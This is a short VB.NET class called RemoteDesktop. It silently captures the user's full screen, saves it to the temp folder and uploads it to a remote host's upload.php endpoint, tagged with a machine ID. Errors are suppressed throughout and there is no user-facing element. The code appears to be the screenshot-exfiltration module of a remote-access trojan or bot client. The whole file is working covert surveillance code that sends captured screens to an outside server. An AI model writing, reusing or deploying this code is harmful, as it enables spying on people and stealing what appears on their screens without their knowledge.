Imports System.Drawing.Imaging
Public Class RemoteDesktop
    Public Host As String
    Public ID As String

    Public Sub Start()
        Try
            TakeScreen(IO.Path.GetTempPath & "/" & ID & ".png")
        Catch ex As Exception

        End Try
    End Sub
    Sub Upload(ByVal screenshot As String)
        My.Computer.Network.UploadFile(screenshot, Host & "/upload.php?id=" & ID)
    End Sub
    Public Sub TakeScreen(ByVal filename As String)
        On Error Resume Next
        Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
        Dim image As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)
        Dim graphics As Graphics = graphics.FromImage(image)
        Dim upperLeftSource As New Point(0, 0)
        Dim upperLeftDestination As New Point(0, 0)
        graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, primaryMonitorSize)
        graphics.Flush()
        image.Save(filename, ImageFormat.Png)
        Upload(filename)
    End Sub
End Class